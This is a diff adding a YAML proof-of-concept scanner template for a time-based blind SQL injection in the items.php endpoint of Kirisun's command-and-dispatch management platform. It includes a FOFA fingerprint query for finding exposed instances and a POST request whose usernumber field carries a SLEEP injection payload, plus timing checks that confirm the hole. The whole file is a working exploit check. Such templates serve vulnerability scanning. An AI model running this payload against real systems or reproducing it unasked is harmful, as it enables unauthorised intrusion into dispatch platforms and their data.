@@ -1,0 +1,21 @@
+id: poc-yaml-kirisun-items-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 items.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /api/get_sos/items.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1'
+    AND (SELECT 5464 FROM (SELECT(SLEEP({{.t1}})))FZxX) AND 'khLM'='khLM
+  expression: status_code == 200 && contains(body,"\"code\":\"-1\"") && contains(body,"user
+    not found") && !contains(body,"<") && duration > t1 && duration < t2
+transport: http
